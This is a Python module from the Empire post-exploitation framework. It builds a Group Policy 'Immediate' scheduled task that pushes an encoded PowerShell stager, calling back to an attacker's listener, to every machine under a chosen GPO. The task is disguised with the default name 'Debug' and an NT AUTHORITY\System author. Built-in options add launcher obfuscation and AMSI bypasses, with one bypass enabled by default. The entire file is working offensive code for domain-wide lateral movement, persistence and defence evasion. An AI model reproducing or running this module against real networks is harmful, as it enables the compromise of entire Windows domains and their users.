from __future__ import print_function

from builtins import object
from builtins import str

from empire.server.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'New-GPOImmediateTask',

            'Author': ['@harmj0y'],

            'Description': ("Builds an 'Immediate' schtask to push out through a specified GPO."),

            'Software': 'S0111',

            'Techniques': ['T1053'],

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'TaskName': {
                'Description': 'Name for the schtask to create.',
                'Required': True,
                'Value': 'Debug'
            },
            'TaskDescription': {
                'Description': 'Name for the schtask to create.',
                'Required': False,
                'Value': 'Debugging functionality.'
            },
            'TaskAuthor': {
                'Description': 'Name for the schtask to create.',
                'Required': True,
                'Value': 'NT AUTHORITY\System'
            },
            'GPOname': {
                'Description': 'The GPO name to build the task for.',
                'Required': False,
                'Value': ''
            },
            'GPODisplayName': {
                'Description': 'The GPO display name to build the task for.',
                'Required': False,
                'Value': ''
            },
            'Domain': {
                'Description': 'The domain to query for the GPOs, defaults to the current domain.',
                'Required': False,
                'Value': ''
            },
            'DomainController': {
                'Description': 'Domain controller to reflect LDAP queries through.',
                'Required': False,
                'Value': ''
            },
            'Listener': {
                'Description': 'Listener to use.',
                'Required': True,
                'Value': ''
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Remove': {
                'Description': 'Switch. Remove the immediate schtask.',
                'Required': False,
                'Value': 'default'
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False'
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'AMSIBypass': {
                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'True'
            },
            'AMSIBypass2': {
                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        # Set booleans to false by default
        Obfuscate = False
        AMSIBypass = False
        AMSIBypass2 = False

        module_name = self.info["Name"]
        listener_name = self.options['Listener']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        if (self.options['Obfuscate']['Value']).lower() == 'true':
            Obfuscate = True
        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
        if (self.options['AMSIBypass']['Value']).lower() == 'true':
            AMSIBypass = True
        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
            AMSIBypass2 = True

        if not self.mainMenu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                               obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                               AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)

            command = "/c \"" + launcher + "\""

            if command == "":
                return ""

            else:

                # read in the common powerview.ps1 module source code
                module_source = self.mainMenu.installPath + "/data/module_source/situational_awareness/network/powerview.ps1"
                try:
                    f = open(module_source, 'r')
                except:
                    print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
                    return ""

                module_code = f.read()
                f.close()

                # get just the code needed for the specified function
                script = helpers.generate_dynamic_powershell_script(module_code, module_name)

                script = module_name + " -Command cmd -CommandArguments '" + command + "' -Force"

                for option, values in self.options.items():
                    if option.lower() in ["taskname", "taskdescription", "taskauthor", "gponame", "gpodisplayname",
                                          "domain", "domaincontroller"]:
                        if values['Value'] and values['Value'] != '':
                            if values['Value'].lower() == "true":
                                # if we're just adding a switch
                                script += " -" + str(option)
                            else:
                                script += " -" + str(option) + " '" + str(values['Value']) + "'"

                script += ' | Out-String | %{$_ + \"`n\"};"`n' + str(module_name) + ' completed!"'

        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                       obfuscationCommand=obfuscationCommand)
        script = helpers.keyword_obfuscation(script)

        return script
